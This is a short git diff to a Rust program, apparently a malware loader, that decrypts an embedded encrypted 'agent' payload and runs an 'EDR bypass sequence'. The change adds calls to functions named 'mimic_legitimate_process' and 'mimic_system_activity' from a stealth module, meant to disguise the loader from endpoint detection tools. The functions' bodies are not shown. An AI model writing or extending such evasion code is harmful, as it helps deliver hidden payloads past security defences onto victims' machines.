@@ -11,6 +11,7 @@ use runtime_loader_rust::{
     data::ENCRYPTED_AGENT,
     crypto::get_decryption_key
 };
+use runtime_loader_rust::edr::stealth::{mimic_legitimate_process, mimic_system_activity};
 
 use aes::Aes128;
 use block_modes::{BlockMode, Ecb};
@@ -69,6 +70,8 @@ fn main() -> Result<(), Box<dyn Error>> {
         return Err("Empty embedded payload".into());
     }
 
+    mimic_legitimate_process();
+    mimic_system_activity();
     log!("[*] Starting EDR bypass sequence...");
 
     // EDR bypass
